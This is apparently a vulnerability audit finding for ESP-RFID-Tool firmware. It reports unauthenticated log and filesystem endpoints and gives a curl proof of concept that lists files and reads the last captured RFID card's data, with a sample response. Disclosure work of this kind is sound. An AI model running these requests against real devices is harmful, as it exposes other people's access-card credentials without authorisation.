### ESPR-07 — Unauthenticated Log View + Filesystem Enumeration

**Severity:** HIGH 
**File:** `esprfidtool.ino` 
**Endpoints:** `/viewlog`, `/listlogs`, `/api/listlogs`, `/api/info`, `/api/lastread`

**Description:** 
All log viewing and filesystem enumeration endpoints require no authentication. The `/api/lastread` endpoint additionally exposes the last captured card in real time.

**Proof of Concept:**
```bash
# Enumerate all files on device
curl "http://192.168.1.1/api/listlogs"

# Read captured card data
curl "http://192.168.1.1/api/lastread"
# Response: {"bits":26,"bitstream":"01001100...","uid":"0A1B2C3D","format":"HID26"}

# Get device info (firmware version, free space)
curl "http://192.168.1.1/api/info"
```

**Impact:** 
Complete exfiltration of all captured RFID card data without any authentication.

